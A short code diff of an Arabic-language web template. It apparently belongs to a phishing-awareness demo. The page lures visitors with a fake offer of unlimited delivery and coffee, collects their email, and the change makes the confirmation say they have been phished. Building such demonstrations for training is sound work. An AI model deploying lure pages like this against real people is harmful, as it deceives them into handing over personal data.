@@ -89,7 +89,7 @@ HTML = '''
 {% if email %}
     <script>showPopup("{{ email|e }}");</script>
     <h1>  </h1>
-    <p>تم استلام الايميل: <strong>{{ email|e }}</strong></p>
+    <p>تم الاصطياد: <strong>{{ email|e }}</strong></p>
 {% else %}
     <h1>سجّل معنا واستمتع بتوصيل غير محدود وقهوة بلا حدود!</h1>
     <form method="post">
